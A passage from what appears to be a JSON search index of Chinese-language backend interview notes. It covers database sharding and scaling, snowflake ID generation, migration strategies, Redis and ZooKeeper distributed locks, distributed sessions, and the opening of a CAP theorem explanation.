服务器之间做迁移就可以了。然后系统配合改一下配置即可。\n比如说最多可以扩展到 32 个数据库服务器，每个数据库服务器是一个库。如果还是不够？最多可以扩展到 1024 个数据库服务器，每个数据库服务器上面一个库一个表。因为最多是 1024 个表。\n这么搞，是不用自己写代码做数据迁移的，都交给 DBA 来搞好了，但是 DBA 确实是需要做一些库表迁移的工作，但是总比你自己写代码，然后抽数据导数据来的效率高得多吧。\n哪怕是要减少库的数量，也很简单，其实说白了就是按倍数缩容就可以了，然后修改一下路由规则。\n这里对步骤做一个总结：\n 设定好几台数据库服务器，每台服务器上几个库，每个库多少个表，推荐是 32 库 * 32 表，对于大部分公司来说，可能几年都够了。 路由的规则，orderId 模 32 = 库，orderId / 32 模 32 = 表 扩容的时候，申请增加更多的数据库服务器，装好 MySQL，呈倍数扩容，4 台服务器，扩到 8 台服务器，再到 16 台服务器。 由 DBA 负责将原先数据库服务器的库，迁移到新的数据库服务器上去，库迁移是有一些便捷的工具的。 我们这边就是修改一下配置，调整迁移的库所在数据库服务器的地址。 重新发布系统，上线，原先的路由规则变都不用变，直接可以基于 n 倍的数据库服务器的资源，继续进行线上系统的提供服务。  "},{"id":146,"href":"/%E9%AB%98%E5%B9%B6%E5%8F%91/database-shard-global-id-generate/","title":"database-shard-global-id-generate","parent":"高并发","content":"面试题    分库分表之后，id 主键如何处理？\n面试官心理分析    其实这是分库分表之后你必然要面对的一个问题，就是 id 咋生成？因为要是分成多个表之后，每个表都是从 1 开始累加，那肯定不对啊，需要一个全局唯一的 id 来支持。所以这都是你实际生产环境中必须考虑的问题。\n面试题剖析    基于数据库的实现方案    数据库自增 id    这个就是说你的系统里每次得到一个 id，都是往一个库的一个表里插入一条没什么业务含义的数据，然后获取一个数据库自增的一个 id。拿到这个 id 之后再往对应的分库分表里去写入。\n这个方案的好处就是方便简单，谁都会用；缺点就是单库生成自增 id，要是高并发的话，就会有瓶颈的；如果你硬是要改进一下，那么就专门开一个服务出来，这个服务每次就拿到当前 id 最大值，然后自己递增几个 id，一次性返回一批 id，然后再把当前最大 id 值修改成递增几个 id 之后的一个值；但是无论如何都是基于单个数据库。\n适合的场景：你分库分表就俩原因，要不就是单库并发太高，要不就是单库数据量太大；除非是你并发不高，但是数据量太大导致的分库分表扩容，你可以用这个方案，因为可能每秒最高并发最多就几百，那么就走单独的一个库和表生成自增主键即可。\n设置数据库 sequence 或者表自增字段步长    可以通过设置数据库 sequence 或者表的自增字段步长来进行水平伸缩。\n比如说，现在有 8 个服务节点，每个服务节点使用一个 sequence 功能来产生 ID，每个 sequence 的起始 ID 不同，并且依次递增，步长都是 8。\n适合的场景：在用户防止产生的 ID 重复时，这种方案实现起来比较简单，也能达到性能目标。但是服务节点固定，步长也固定，将来如果还要增加服务节点，就不好搞了。\nUUID    好处就是本地生成，不要基于数据库来了；不好之处就是，UUID 太长了、占用空间大，作为主键性能太差了；更重要的是，UUID 不具有有序性，会导致 B+ 树索引在写的时候有过多的随机写操作（连续的 ID 可以产生部分顺序写），还有，由于在写的时候不能产生有顺序的 append 操作，而需要进行 insert 操作，将会读取整个 B+ 树节点到内存，在插入这条记录后会将整个节点写回磁盘，这种操作在记录占用空间比较大的情况下，性能下降明显。\n适合的场景：如果你是要随机生成个什么文件名、编号之类的，你可以用 UUID，但是作为主键是不能用 UUID 的。\nUUID.randomUUID().toString().replace(\u0026#34;-\u0026#34;, \u0026#34;\u0026#34;) -\u0026gt; sfsdf23423rr234sfdaf 获取系统当前时间    这个就是获取当前时间即可，但是问题是，并发很高的时候，比如一秒并发几千，会有重复的情况，这个是肯定不合适的。基本就不用考虑了。\n适合的场景：一般如果用这个方案，是将当前时间跟很多其他的业务字段拼接起来，作为一个 id，如果业务上你觉得可以接受，那么也是可以的。你可以将别的业务字段值跟当前时间拼接起来，组成一个全局唯一的编号。\nsnowflake 算法    snowflake 算法是 twitter 开源的分布式 id 生成算法，采用 Scala 语言实现，是把一个 64 位的 long 型的 id，1 个 bit 是不用的，用其中的 41 bits 作为毫秒数，用 10 bits 作为工作机器 id，12 bits 作为序列号。\n 1 bit：不用，为啥呢？因为二进制里第一个 bit 为如果是 1，那么都是负数，但是我们生成的 id 都是正数，所以第一个 bit 统一都是 0。 41 bits：表示的是时间戳，单位是毫秒。41 bits 可以表示的数字多达 2^41 - 1 ，也就是可以标识 2^41 - 1 个毫秒值，换算成年就是表示 69 年的时间。 10 bits：记录工作机器 id，代表的是这个服务最多可以部署在 2^10 台机器上，也就是 1024 台机器。但是 10 bits 里 5 个 bits 代表机房 id，5 个 bits 代表机器 id。意思就是最多代表 2^5 个机房（32 个机房），每个机房里可以代表 2^5 个机器（32 台机器）。 12 bits：这个是用来记录同一个毫秒内产生的不同 id，12 bits 可以代表的最大正整数是 2^12 - 1 = 4096 ，也就是说可以用这个 12 bits 代表的数字来区分同一个毫秒内的 4096 个不同的 id。  0 | 0001100 10100010 10111110 10001001 01011100 00 | 10001 | 1 1001 | 0000 00000000 public class IdWorker { private long workerId; private long datacenterId; private long sequence; public IdWorker(long workerId, long datacenterId, long sequence) { // sanity check for workerId  // 这儿不就检查了一下，要求就是你传递进来的机房id和机器id不能超过32，不能小于0  if (workerId \u0026gt; maxWorkerId || workerId \u0026lt; 0) { throw new IllegalArgumentException( String.format(\u0026#34;worker Id can\u0026#39;t be greater than %d or less than 0\u0026#34;, maxWorkerId)); } if (datacenterId \u0026gt; maxDatacenterId || datacenterId \u0026lt; 0) { throw new IllegalArgumentException( String.format(\u0026#34;datacenter Id can\u0026#39;t be greater than %d or less than 0\u0026#34;, maxDatacenterId)); } System.out.printf( \u0026#34;worker starting. timestamp left shift %d, datacenter id bits %d, worker id bits %d, sequence bits %d, workerid %d\u0026#34;, timestampLeftShift, datacenterIdBits, workerIdBits, sequenceBits, workerId); this.workerId = workerId; this.datacenterId = datacenterId; this.sequence = sequence; } private long twepoch = 1288834974657L; private long workerIdBits = 5L; private long datacenterIdBits = 5L; // 这个是二进制运算，就是 5 bit最多只能有31个数字，也就是说机器id最多只能是32以内  private long maxWorkerId = -1L ^ (-1L \u0026lt;\u0026lt; workerIdBits); // 这个是一个意思，就是 5 bit最多只能有31个数字，机房id最多只能是32以内  private long maxDatacenterId = -1L ^ (-1L \u0026lt;\u0026lt; datacenterIdBits); private long sequenceBits = 12L; private long workerIdShift = sequenceBits; private long datacenterIdShift = sequenceBits + workerIdBits; private long timestampLeftShift = sequenceBits + workerIdBits + datacenterIdBits; private long sequenceMask = -1L ^ (-1L \u0026lt;\u0026lt; sequenceBits); private long lastTimestamp = -1L; public long getWorkerId() { return workerId; } public long getDatacenterId() { return datacenterId; } public long getTimestamp() { return System.currentTimeMillis(); } public synchronized long nextId() { // 这儿就是获取当前时间戳，单位是毫秒  long timestamp = timeGen(); if (timestamp \u0026lt; lastTimestamp) { System.err.printf(\u0026#34;clock is moving backwards. Rejecting requests until %d.\u0026#34;, lastTimestamp); throw new RuntimeException(String.format( \u0026#34;Clock moved backwards. Refusing to generate id for %d milliseconds\u0026#34;, lastTimestamp - timestamp)); } if (lastTimestamp == timestamp) { // 这个意思是说一个毫秒内最多只能有4096个数字  // 无论你传递多少进来，这个位运算保证始终就是在4096这个范围内，避免你自己传递个sequence超过了4096这个范围  sequence = (sequence + 1) \u0026amp; sequenceMask; if (sequence == 0) { timestamp = tilNextMillis(lastTimestamp); } } else { sequence = 0; } // 这儿记录一下最近一次生成id的时间戳，单位是毫秒  lastTimestamp = timestamp; // 这儿就是将时间戳左移，放到 41 bit那儿；  // 将机房 id左移放到 5 bit那儿；  // 将机器id左移放到5 bit那儿；将序号放最后12 bit；  // 最后拼接起来成一个 64 bit的二进制数字，转换成 10 进制就是个 long 型  return ((timestamp - twepoch) \u0026lt;\u0026lt; timestampLeftShift) | (datacenterId \u0026lt;\u0026lt; datacenterIdShift) | (workerId \u0026lt;\u0026lt; workerIdShift) | sequence; } private long tilNextMillis(long lastTimestamp) { long timestamp = timeGen(); while (timestamp \u0026lt;= lastTimestamp) { timestamp = timeGen(); } return timestamp; } private long timeGen() { return System.currentTimeMillis(); } // ---------------测试---------------  public static void main(String[] args) { IdWorker worker = new IdWorker(1, 1, 1); for (int i = 0; i \u0026lt; 30; i++) { System.out.println(worker.nextId()); } } } 怎么说呢，大概这个意思吧，就是说 41 bit 是当前毫秒单位的一个时间戳，就这意思；然后 5 bit 是你传递进来的一个机房 id（但是最大只能是 32 以内），另外 5 bit 是你传递进来的机器 id（但是最大只能是 32 以内），剩下的那个 12 bit 序列号，就是如果跟你上次生成 id 的时间还在一个毫秒内，那么会把顺序给你累加，最多在 4096 个序号以内。\n所以你自己利用这个工具类，自己搞一个服务，然后对每个机房的每个机器都初始化这么一个东西，刚开始这个机房的这个机器的序号就是 0。然后每次接收到一个请求，说这个机房的这个机器要生成一个 id，你就找到对应的 Worker 生成。\n利用这个 snowflake 算法，你可以开发自己公司的服务，甚至对于机房 id 和机器 id，反正给你预留了 5 bit + 5 bit，你换成别的有业务含义的东西也可以的。\n这个 snowflake 算法相对来说还是比较靠谱的，所以你要真是搞分布式 id 生成，如果是高并发啥的，那么用这个应该性能比较好，一般每秒几万并发的场景，也足够你用了。\n"},{"id":147,"href":"/%E9%AB%98%E5%B9%B6%E5%8F%91/database-shard-method/","title":"database-shard-method","parent":"高并发","content":"面试题    现在有一个未分库分表的系统，未来要分库分表，如何设计才可以让系统从未分库分表动态切换到分库分表上？\n面试官心理分析    你看看，你现在已经明白为啥要分库分表了，你也知道常用的分库分表中间件了，你也设计好你们如何分库分表的方案了（水平拆分、垂直拆分、分表），那问题来了，你接下来该怎么把你那个单库单表的系统给迁移到分库分表上去？\n所以这都是一环扣一环的，就是看你有没有全流程经历过这个过程。\n面试题剖析    这个其实从 low 到高大上有好几种方案，我们都玩儿过，我都给你说一下。\n停机迁移方案    我先给你说一个最 low 的方案，就是很简单，大家伙儿凌晨 12 点开始运维，网站或者 app 挂个公告，说 0 点到早上 6 点进行运维，无法访问。\n接着到 0 点停机，系统停掉，没有流量写入了，此时老的单库单表数据库静止了。然后你之前得写好一个导数的一次性工具，此时直接跑起来，然后将单库单表的数据哗哗哗读出来，写到分库分表里面去。\n导数完了之后，就 ok 了，修改系统的数据库连接配置啥的，包括可能代码和 SQL 也许有修改，那你就用最新的代码，然后直接启动连到新的分库分表上去。\n验证一下，ok 了，完美，大家伸个懒腰，看看看凌晨 4 点钟的北京夜景，打个滴滴回家吧。\n但是这个方案比较 low，谁都能干，我们来看看高大上一点的方案。\n双写迁移方案    这个是我们常用的一种迁移方案，比较靠谱一些，不用停机，不用看北京凌晨 4 点的风景。\n简单来说，就是在线上系统里面，之前所有写库的地方，增删改操作，除了对老库增删改，都加上对新库的增删改，这就是所谓的双写，同时写俩库，老库和新库。\n然后系统部署之后，新库数据差太远，用之前说的导数工具，跑起来读老库数据写新库，写的时候要根据 gmt_modified 这类字段判断这条数据最后修改的时间，除非是读出来的数据在新库里没有，或者是比新库的数据新才会写。简单来说，就是不允许用老数据覆盖新数据。\n导完一轮之后，有可能数据还是存在不一致，那么就程序自动做一轮校验，比对新老库每个表的每条数据，接着如果有不一样的，就针对那些不一样的，从老库读数据再次写。反复循环，直到两个库每个表的数据都完全一致为止。\n接着当数据完全一致了，就 ok 了，基于仅仅使用分库分表的最新代码，重新部署一次，不就仅仅基于分库分表在操作了么，还没有几个小时的停机时间，很稳。所以现在基本玩儿数据迁移之类的，都是这么干的。\n"},{"id":148,"href":"/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/distributed-lock-redis-vs-zookeeper/","title":"distributed-lock-redis-vs-zookeeper","parent":"分布式系统","content":"面试题    一般实现分布式锁都有哪些方式？使用 Redis 如何设计分布式锁？使用 zk 来设计分布式锁可以吗？这两种分布式锁的实现方式哪种效率比较高？\n面试官心理分析    其实一般问问题，都是这么问的，先问问你 zk，然后其实是要过渡到 zk 相关的一些问题里去，比如分布式锁。因为在分布式系统开发中，分布式锁的使用场景还是很常见的。\n面试题剖析    Redis 分布式锁    官方叫做 RedLock 算法，是 Redis 官方支持的分布式锁算法。\n这个分布式锁有 3 个重要的考量点：\n 互斥（只能有一个客户端获取锁） 不能死锁 容错（只要大部分 Redis 节点创建了这把锁就可以）  Redis 最普通的分布式锁    第一个最普通的实现方式，就是在 Redis 里使用 SET key value [EX seconds] [PX milliseconds] NX 创建一个 key，这样就算加锁。其中：\n NX：表示只有 key 不存在的时候才会设置成功，如果此时 redis 中存在这个 key，那么设置失败，返回 nil。 EX seconds：设置 key 的过期时间，精确到秒级。意思是 seconds 秒后锁自动释放，别人创建的时候如果发现已经有了就不能加锁了。 PX milliseconds：同样是设置 key 的过期时间，精确到毫秒级。  比如执行以下命令：\nSET resource_name my_random_value PX 30000 NX 释放锁就是删除 key ，但是一般可以用 lua 脚本删除，判断 value 一样才删除：\n-- 删除锁的时候，找到 key 对应的 value，跟自己传过去的 value 做比较，如果是一样的才删除。 if redis.call(\u0026#34;get\u0026#34;,KEYS[1]) == ARGV[1] then return redis.call(\u0026#34;del\u0026#34;,KEYS[1]) else return 0 end 为啥要用 random_value 随机值呢？因为如果某个客户端获取到了锁，但是阻塞了很长时间才执行完，比如说超过了 30s，此时可能已经自动释放锁了，此时可能别的客户端已经获取到了这个锁，要是你这个时候直接删除 key 的话会有问题，所以得用随机值加上面的 lua 脚本来释放锁。\n但是这样是肯定不行的。因为如果是普通的 Redis 单实例，那就是单点故障。或者是 Redis 普通主从，那 Redis 主从异步复制，如果主节点挂了（key 就没有了），key 还没同步到从节点，此时从节点切换为主节点，别人就可以 set key，从而拿到锁。\nRedLock 算法    这个场景是假设有一个 Redis cluster，有 5 个 Redis master 实例。然后执行如下步骤获取一把锁：\n 获取当前时间戳，单位是毫秒； 跟上面类似，轮流尝试在每个 master 节点上创建锁，超时时间较短，一般就几十毫秒（客户端为了获取锁而使用的超时时间比自动释放锁的总时间要小。例如，如果自动释放时间是 10 秒，那么超时时间可能在 5~50 毫秒范围内）； 尝试在大多数节点上建立一个锁，比如 5 个节点就要求是 3 个节点 n / 2 + 1 ； 客户端计算建立好锁的时间，如果建立锁的时间小于超时时间，就算建立成功了； 要是锁建立失败了，那么就依次之前建立过的锁删除； 只要别人建立了一把分布式锁，你就得不断轮询去尝试获取锁。  Redis 官方给出了以上两种基于 Redis 实现分布式锁的方法，详细说明可以查看：https://redis.io/topics/distlock 。\nzk 分布式锁    zk 分布式锁，其实可以做的比较简单，就是某个节点尝试创建临时 znode，此时创建成功了就获取了这个锁；这个时候别的客户端来创建锁会失败，只能注册个监听器监听这个锁。释放锁就是删除这个 znode，一旦释放掉就会通知客户端，然后有一个等待着的客户端就可以再次重新加锁。\n/** * ZooKeeperSession */ public class ZooKeeperSession { private static CountDownLatch connectedSemaphore = new CountDownLatch(1); private ZooKeeper zookeeper; private CountDownLatch latch; public ZooKeeperSession() { try { this.zookeeper = new ZooKeeper(\u0026#34;192.168.31.187:2181,192.168.31.19:2181,192.168.31.227:2181\u0026#34;, 50000, new ZooKeeperWatcher()); try { connectedSemaphore.await(); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(\u0026#34;ZooKeeper session established......\u0026#34;); } catch (Exception e) { e.printStackTrace(); } } /** * 获取分布式锁 * * @param productId */ public Boolean acquireDistributedLock(Long productId) { String path = \u0026#34;/product-lock-\u0026#34; + productId; try { zookeeper.create(path, \u0026#34;\u0026#34;.getBytes(), Ids.OPEN_ACL_UNSAFE, CreateMode.EPHEMERAL); return true; } catch (Exception e) { while (true) { try { // 相当于是给node注册一个监听器，去看看这个监听器是否存在  Stat stat = zk.exists(path, true); if (stat != null) { this.latch = new CountDownLatch(1); this.latch.await(waitTime, TimeUnit.MILLISECONDS); this.latch = null; } zookeeper.create(path, \u0026#34;\u0026#34;.getBytes(), Ids.OPEN_ACL_UNSAFE, CreateMode.EPHEMERAL); return true; } catch (Exception ee) { continue; } } } return true; } /** * 释放掉一个分布式锁 * * @param productId */ public void releaseDistributedLock(Long productId) { String path = \u0026#34;/product-lock-\u0026#34; + productId; try { zookeeper.delete(path, -1); System.out.println(\u0026#34;release the lock for product[id=\u0026#34; + productId + \u0026#34;]......\u0026#34;); } catch (Exception e) { e.printStackTrace(); } } /** * 建立 zk session 的 watcher */ private class ZooKeeperWatcher implements Watcher { public void process(WatchedEvent event) { System.out.println(\u0026#34;Receive watched event: \u0026#34; + event.getState()); if (KeeperState.SyncConnected == event.getState()) { connectedSemaphore.countDown(); } if (this.latch != null) { this.latch.countDown(); } } } /** * 封装单例的静态内部类 */ private static class Singleton { private static ZooKeeperSession instance; static { instance = new ZooKeeperSession(); } public static ZooKeeperSession getInstance() { return instance; } } /** * 获取单例 * * @return */ public static ZooKeeperSession getInstance() { return Singleton.getInstance(); } /** * 初始化单例的便捷方法 */ public static void init() { getInstance(); } } 也可以采用另一种方式，创建临时顺序节点：\n如果有一把锁，被多个人给竞争，此时多个人会排队，第一个拿到锁的人会执行，然后释放锁；后面的每个人都会去监听排在自己前面的那个人创建的 node 上，一旦某个人释放了锁，排在自己后面的人就会被 ZooKeeper 给通知，一旦被通知了之后，就 ok 了，自己就获取到了锁，就可以执行代码了。\npublic class ZooKeeperDistributedLock implements Watcher { private ZooKeeper zk; private String locksRoot = \u0026#34;/locks\u0026#34;; private String productId; private String waitNode; private String lockNode; private CountDownLatch latch; private CountDownLatch connectedLatch = new CountDownLatch(1); private int sessionTimeout = 30000; public ZooKeeperDistributedLock(String productId) { this.productId = productId; try { String address = \u0026#34;192.168.31.187:2181,192.168.31.19:2181,192.168.31.227:2181\u0026#34;; zk = new ZooKeeper(address, sessionTimeout, this); connectedLatch.await(); } catch (IOException e) { throw new LockException(e); } catch (KeeperException e) { throw new LockException(e); } catch (InterruptedException e) { throw new LockException(e); } } public void process(WatchedEvent event) { if (event.getState() == KeeperState.SyncConnected) { connectedLatch.countDown(); return; } if (this.latch != null) { this.latch.countDown(); } } public void acquireDistributedLock() { try { if (this.tryLock()) { return; } else { waitForLock(waitNode, sessionTimeout); } } catch (KeeperException e) { throw new LockException(e); } catch (InterruptedException e) { throw new LockException(e); } } public boolean tryLock() { try { // 传入进去的locksRoot + “/” + productId \t// 假设productId代表了一个商品id，比如说1 \t// locksRoot = locks \t// /locks/10000000000，/locks/10000000001，/locks/10000000002  lockNode = zk.create(locksRoot + \u0026#34;/\u0026#34; + productId, new byte[0], ZooDefs.Ids.OPEN_ACL_UNSAFE, CreateMode.EPHEMERAL_SEQUENTIAL); // 看看刚创建的节点是不是最小的节点 \t// locks：10000000000，10000000001，10000000002  List\u0026lt;String\u0026gt; locks = zk.getChildren(locksRoot, false); Collections.sort(locks); if(lockNode.equals(locksRoot+\u0026#34;/\u0026#34;+ locks.get(0))){ //如果是最小的节点,则表示取得锁  return true; } //如果不是最小的节点，找到比自己小1的节点 \tint previousLockIndex = -1; for(int i = 0; i \u0026lt; locks.size(); i++) { if(lockNode.equals(locksRoot + “/” + locks.get(i))) { previousLockIndex = i - 1; break; } } this.waitNode = locks.get(previousLockIndex); } catch (KeeperException e) { throw new LockException(e); } catch (InterruptedException e) { throw new LockException(e); } return false; } private boolean waitForLock(String waitNode, long waitTime) throws InterruptedException, KeeperException { Stat stat = zk.exists(locksRoot + \u0026#34;/\u0026#34; + waitNode, true); if (stat != null) { this.latch = new CountDownLatch(1); this.latch.await(waitTime, TimeUnit.MILLISECONDS); this.latch = null; } return true; } public void unlock() { try { // 删除/locks/10000000000节点  // 删除/locks/10000000001节点  System.out.println(\u0026#34;unlock \u0026#34; + lockNode); zk.delete(lockNode, -1); lockNode = null; zk.close(); } catch (InterruptedException e) { e.printStackTrace(); } catch (KeeperException e) { e.printStackTrace(); } } public class LockException extends RuntimeException { private static final long serialVersionUID = 1L; public LockException(String e) { super(e); } public LockException(Exception e) { super(e); } } } 但是，使用 zk 临时节点会存在另一个问题：由于 zk 依靠 session 定期的心跳来维持客户端，如果客户端进入长时间的 GC，可能会导致 zk 认为客户端宕机而释放锁，让其他的客户端获取锁，但是客户端在 GC 恢复后，会认为自己还持有锁，从而可能出现多个客户端同时获取到锁的情形。#209\n针对这种情况，可以通过 JVM 调优，尽量避免长时间 GC 的情况发生。\nredis 分布式锁和 zk 分布式锁的对比     redis 分布式锁，其实需要自己不断去尝试获取锁，比较消耗性能。 zk 分布式锁，获取不到锁，注册个监听器即可，不需要不断主动尝试获取锁，性能开销较小。  另外一点就是，如果是 Redis 获取锁的那个客户端 出现 bug 挂了，那么只能等待超时时间之后才能释放锁；而 zk 的话，因为创建的是临时 znode，只要客户端挂了，znode 就没了，此时就自动释放锁。\nRedis 分布式锁大家没发现好麻烦吗？遍历上锁，计算时间等等\u0026hellip;\u0026hellip;zk 的分布式锁语义清晰实现简单。\n所以先不分析太多的东西，就说这两点，我个人实践认为 zk 的分布式锁比 Redis 的分布式锁牢靠、而且模型简单易用。\n"},{"id":149,"href":"/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/distributed-session/","title":"distributed-session","parent":"分布式系统","content":"面试题    集群部署时的分布式 Session 如何实现？\n面试官心理分析    面试官问了你一堆 Dubbo 是怎么玩儿的，你会玩儿 Dubbo 就可以把单块系统弄成分布式系统，然后分布式之后接踵而来的就是一堆问题，最大的问题就是分布式事务、接口幂等性、分布式锁，还有最后一个就是分布式 Session。\n当然了，分布式系统中的问题何止这么一点，非常之多，复杂度很高，这里只是说一下常见的几个问题，也是面试的时候常问的几个。\n面试题剖析    Session 是啥？浏览器有个 Cookie，在一段时间内这个 Cookie 都存在，然后每次发请求过来都带上一个特殊的 jsessionid cookie ，就根据这个东西，在服务端可以维护一个对应的 Session 域，里面可以放点数据。\n一般的话只要你没关掉浏览器，Cookie 还在，那么对应的那个 Session 就在，但是如果 Cookie 没了，Session 也就没了。常见于什么购物车之类的东西，还有登录状态保存之类的。\n这个不多说了，懂 Java 的都该知道这个。\n单块系统的时候这么玩儿 Session 没问题，但是你要是分布式系统呢，那么多的服务，Session 状态在哪儿维护啊？\n其实方法很多，但是常见常用的是以下几种：\n完全不用 Session    使用 JWT Token 储存用户身份，然后再从数据库或者 cache 中获取其他的信息。这样无论请求分配到哪个服务器都无所谓。\nTomcat + Redis    这个其实还挺方便的，就是使用 Session 的代码，跟以前一样，还是基于 Tomcat 原生的 Session 支持即可，然后就是用一个叫做 Tomcat RedisSessionManager 的东西，让所有我们部署的 Tomcat 都将 Session 数据存储到 Redis 即可。\n在 Tomcat 的配置文件中配置：\n\u0026lt;Valve className=\u0026#34;com.orangefunction.tomcat.redissessions.RedisSessionHandlerValve\u0026#34; /\u0026gt; \u0026lt;Manager className=\u0026#34;com.orangefunction.tomcat.redissessions.RedisSessionManager\u0026#34; host=\u0026#34;{redis.host}\u0026#34; port=\u0026#34;{redis.port}\u0026#34; database=\u0026#34;{redis.dbnum}\u0026#34; maxInactiveInterval=\u0026#34;60\u0026#34;/\u0026gt; 然后指定 Redis 的 host 和 port 就 ok 了。\n\u0026lt;Valve className=\u0026#34;com.orangefunction.tomcat.redissessions.RedisSessionHandlerValve\u0026#34; /\u0026gt; \u0026lt;Manager className=\u0026#34;com.orangefunction.tomcat.redissessions.RedisSessionManager\u0026#34; sentinelMaster=\u0026#34;mymaster\u0026#34; sentinels=\u0026#34;\u0026lt;sentinel1-ip\u0026gt;:26379,\u0026lt;sentinel2-ip\u0026gt;:26379,\u0026lt;sentinel3-ip\u0026gt;:26379\u0026#34; maxInactiveInterval=\u0026#34;60\u0026#34;/\u0026gt; 还可以用上面这种方式基于 Redis 哨兵支持的 Redis 高可用集群来保存 Session 数据，都是 ok 的。\nSpring Session + Redis    上面所说的第二种方式会与 Tomcat 容器重耦合，如果我要将 Web 容器迁移成 Jetty，难道还要重新把 Jetty 都配置一遍？\n因为上面那种 Tomcat + Redis 的方式好用，但是会严重依赖于 Web 容器，不好将代码移植到其他 Web 容器上去，尤其是你要是换了技术栈咋整？比如换成了 Spring Cloud 或者是 Spring Boot 之类的呢？\n所以现在比较好的还是基于 Java 一站式解决方案，也就是 Spring。人家 Spring 基本上承包了大部分我们需要使用的框架，Spirng Cloud 做微服务，Spring Boot 做脚手架，所以用 Spring Session 是一个很好的选择。\n在 pom.xml 中配置：\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.session\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-session-data-redis\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.1.RELEASE\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;redis.clients\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jedis\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.8.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 在 Spring 配置文件中配置：\n\u0026lt;bean id=\u0026#34;redisHttpSessionConfiguration\u0026#34; class=\u0026#34;org.springframework.session.data.redis.config.annotation.web.http.RedisHttpSessionConfiguration\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;maxInactiveIntervalInSeconds\u0026#34; value=\u0026#34;600\u0026#34;/\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;bean id=\u0026#34;jedisPoolConfig\u0026#34; class=\u0026#34;redis.clients.jedis.JedisPoolConfig\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;maxTotal\u0026#34; value=\u0026#34;100\u0026#34; /\u0026gt; \u0026lt;property name=\u0026#34;maxIdle\u0026#34; value=\u0026#34;10\u0026#34; /\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;bean id=\u0026#34;jedisConnectionFactory\u0026#34; class=\u0026#34;org.springframework.data.redis.connection.jedis.JedisConnectionFactory\u0026#34; destroy-method=\u0026#34;destroy\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;hostName\u0026#34; value=\u0026#34;${redis_hostname}\u0026#34;/\u0026gt; \u0026lt;property name=\u0026#34;port\u0026#34; value=\u0026#34;${redis_port}\u0026#34;/\u0026gt; \u0026lt;property name=\u0026#34;password\u0026#34; value=\u0026#34;${redis_pwd}\u0026#34; /\u0026gt; \u0026lt;property name=\u0026#34;timeout\u0026#34; value=\u0026#34;3000\u0026#34;/\u0026gt; \u0026lt;property name=\u0026#34;usePool\u0026#34; value=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;property name=\u0026#34;poolConfig\u0026#34; ref=\u0026#34;jedisPoolConfig\u0026#34;/\u0026gt; \u0026lt;/bean\u0026gt; 在 web.xml 中配置：\n\u0026lt;filter\u0026gt; \u0026lt;filter-name\u0026gt;springSessionRepositoryFilter\u0026lt;/filter-name\u0026gt; \u0026lt;filter-class\u0026gt;org.springframework.web.filter.DelegatingFilterProxy\u0026lt;/filter-class\u0026gt; \u0026lt;/filter\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;springSessionRepositoryFilter\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/*\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; 示例代码：\n@RestController @RequestMapping(\u0026#34;/test\u0026#34;) public class TestController { @RequestMapping(\u0026#34;/putIntoSession\u0026#34;) public String putIntoSession(HttpServletRequest request, String username) { request.getSession().setAttribute(\u0026#34;name\u0026#34;, \u0026#34;leo\u0026#34;); return \u0026#34;ok\u0026#34;; } @RequestMapping(\u0026#34;/getFromSession\u0026#34;) public String getFromSession(HttpServletRequest request, Model model){ String name = request.getSession().getAttribute(\u0026#34;name\u0026#34;); return name; } } 上面的代码就是 ok 的，给 Spring Session 配置基于 Redis 来存储 Session 数据，然后配置了一个 Spring Session 的过滤器，这样的话，Session 相关操作都会交给 Spring Session 来管了。接着在代码中，就用原生的 Session 操作，就是直接基于 Spring Session 从 Redis 中获取数据了。\n实现分布式的会话有很多种方式，我说的只不过是比较常见的几种方式，Tomcat + Redis 早期比较常用，但是会重耦合到 Tomcat 中；近些年，通过 Spring Session 来实现。\n"},{"id":150,"href":"/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/distributed-system-cap/","title":"distributed-system-cap","parent":"分布式系统","content":"分布式系统 CAP 定理 P 代表什么含义    作者之前在看 CAP 定理时抱有很大的疑惑，CAP 定理的定义是指在分布式系统中三者只能满足其二，也就是存在分布式 CA 系统的。作者在网络上查阅了很多关于 CAP 文章，虽然这些文章对于 P 的解释五花八门，但总结下来这些观点大多都是指 P 是不可缺少的，也就是说在分布式系统只能是 AP 或者 CP，这种理论与我之前所认识的理论（存在分布式 CA 系统）是冲突的，所以才有了疑惑。\n 这个定理起源于加州大学柏克莱分校（University of California, Berkeley）的计算机科学家埃里克·布鲁尔在 2000 年的分布式计算原理研讨会（PODC）上提出的一个猜想。 在 2002 年，麻省理工学院（MIT）的赛斯·吉尔伯特和南希·林奇发表了布鲁尔猜想的证明，使之成为一个定理。\n 什么是 CAP 定理（CAP theorem）    在理论计算机科学中，CAP 定理（CAP theorem），又被称作布鲁尔定理（Brewer\u0026rsquo;s theorem），它指出对于一个分布式计算系统来说，不可能同时满足以下三点：\n 一致性（Consistency） （等同于所有节点访问同一份最新的数据副本） 可用性（Availability）（每次请求都能获取到非错的响应——但是不保证获取的数据为最新数据） 分区容错性（Partition tolerance）（以实际效果而言，分区相当于对通信的时限要求。系统如果不能在时限内达成数据一致性，就意味着发生了分区的情况，必须就当前操作在 C 和 A 之间做出选择。）  分区容错性（Partition tolerance）    理解 CAP 理论的最简单方式是想象两个节点分处分区两侧。允许至少一个节点更新状态会导致数据不一致，即丧失了 C 